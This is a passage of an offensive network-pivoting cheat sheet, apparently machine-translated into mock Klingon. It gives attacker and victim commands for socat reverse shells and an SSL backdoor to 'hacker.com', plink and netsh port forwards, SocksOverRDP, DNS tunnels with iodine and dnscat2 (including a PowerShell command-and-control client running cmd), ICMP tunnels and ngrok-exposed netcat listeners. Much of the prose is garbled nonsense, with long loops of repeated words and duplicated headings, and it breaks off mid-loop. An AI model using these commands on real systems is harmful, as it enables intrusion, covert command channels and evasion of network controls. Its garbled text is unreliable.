vIghro' **ghItlh** proxy **ghItlh** bypass **ghItlh** line **ghItlh** victim's console **ghItlh** last **ghItlh** instead **ghItlh** executing **ghItlh** can:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Create certificates on both sides: Client and Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Connect the local SSH port (22) to the 443 port of the attacker host

### Qa'chuq Port2Port

Qa'chuq lo'laH SSH port (22) vItlhutlh attacker host 443 port.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

ghItlh vItlhutlh PuTTY version ( 'ej options vItlhutlh ssh client vItlhutlh).

vaj binary vItlhutlh victim 'ej 'oH ssh client vItlhutlh, maHegh ssh service 'ej port vItlhutlh vItlhutlh reverse connection. vaj, locally accessible port vItlhutlh port vItlhutlh machine:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

tlhIngan Hol:
*ghaH* jatlhqa'laHbe'chugh *local admin* (wa'logh *port*) jatlhqa'laH.
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

**RDP qaw'lu'wI'** **'e' vItlhutlh**.\
Download:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - **'ej tool** 'ej **Dynamic Virtual Channels** (`DVC`) **Remote Desktop Service** Windows **feature**. DVC **RDP connection** **tunneling packets** **responsible**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

**SocksOverRDP-Plugin.dll** **client computer** **load** **vaj**.
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
**ghItlh** **connect** **victim** **RDP** **mstsc.exe** **, 'ej **prompt** **SocksOverRDP plugin enabled** **, 'ej** **listen** **127.0.0.1:1080**.

**Connect** **RDP** **upload** **execute** **victim machine** `SocksOverRDP-Server.exe` **binary**:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
DaH, yIlo' (attacker) machinen vItlhutlh 1080 port qar'a'?
```
netstat -antb | findstr 1080
```
**Proxifier** **to'wI'** (https://www.proxifier.com/) **laH** **porgh** **traffic** **proxy** **vaj.**

## Proxify Windows GUI Apps

[**Proxifier**](https://www.proxifier.com/) **laH** **Windows GUI Apps** **proxy** **vaj.**\
**Profile -> Proxy Servers** **IP** **teb** **port** **SOCKS server** **add**.\
**Profile -> Proxification Rules** **program** **name** **add** **proxify** **'ej** **IPs** **proxify** **want**.

## NTLM proxy bypass

**Rpivot** **ghaH** **tool** **jatlh**:\
**OpenVPN** **bypass** **jatlh**, **configuration file** **options** **setting** **'e':
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

ghIt authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.\
For example that forward port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Qong, qaStaHvIS, vItlhutlh **SSH** **service** vItlhutlh 443 port. vaj vItlhutlh 2222 port vItlhutlh attacker.\
vaj **meterpreter** vItlhutlh localhost:443 vaj attacker vItlhutlh 2222 port vItlhutlh vItlhutlh.

## YARP

Microsoft qorDu'wI' vItlhutlh reverse proxy. [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

DNS queries vItlhutlh vItlhutlh tun adapters vaj tunnel data vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vIt
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
**Klingon Translation:**

```
Qa'vIn vItlhutlh. bIngDaq tunnel vItlhutlhlaHbe'lu'chu' SSH connection compressed yIlo'laHbe'lu'chu' jImej:
```

**English Translation:**

```
The tunnel will be very slow. You can create a compressed SSH connection through this tunnel by using:
```
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

DNSDaq2 vItlhutlh. DNSDaq2 vItlhutlh C\&C channel ngev through DNS. vItlhutlh root privileges.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

**PowerShell** vItlh **dnscat2-powershell** (https://github.com/lukebaggett/dnscat2-powershell) vItlh **dnscat2** client vItlh run:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding with dnscat**

#### **Port forwarding with dnscat**

Dnscat is a tool that allows you to create a covert communication channel by using DNS queries and responses. It can be used for port forwarding, which is a technique that allows you to access services running on a remote machine through a compromised host.

To set up port forwarding with dnscat, follow these steps:

1. Install dnscat on both the compromised host and the remote machine.

2. Start the dnscat server on the compromised host by running the following command:
   ```
   dnscat --dns <dns_server_ip>
   ```

3. Start the dnscat client on the remote machine by running the following command:
   ```
   dnscat --dns <dns_server_ip> --dns-port <dns_server_port>
   ```

4. On the compromised host, create a port forward by running the following command:
   ```
   portfwd add <local_port> <remote_host> <remote_port>
   ```

   This will forward traffic from the local port on the compromised host to the remote port on the remote machine.

5. Test the port forward by accessing the service on the remote machine through the compromised host. For example, if you have forwarded port 80, you can access a web server running on the remote machine by opening a web browser on the compromised host and entering `http://localhost:80`.

Port forwarding with dnscat can be a useful technique in scenarios where direct access to a remote machine is not possible, but DNS traffic is allowed. However, it is important to note that this technique may raise suspicion and can be detected by network monitoring tools.
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Change proxychains DNS

Proxychains intercepts `gethostbyname` libc call and tunnels tcp DNS request through the socks proxy. By **default** the **DNS** server that proxychains use is **4.2.2.2** (hardcoded). To change it, edit the file: _/usr/lib/proxychains3/proxyresolv_ and change the IP. If you are in a **Windows environment** you could set the IP of the **domain controller**.

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root is needed in both systems to create tun adapters and tunnel data between them using ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Download it from here**](https://github.com/utoni/ptunnel-ng.git). 

### ptunnel-ng

[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

**[ngrok](https://ngrok.com/) vIghoS tool vItlhutlh Internet vItlhutlh command line.**
*Exposition URI vItlhutlh:* **UID.ngrok.io**

### Installation

- **[ngrok.com/signup](https://ngrok.com/signup)** vItlhutlh account chel.
- Client download:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### QaStaHvIS

**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

*ghaH 'ej TLS, qaStaHvIS.*

#### TCP tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP jImej

HTTP jImej Daq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq 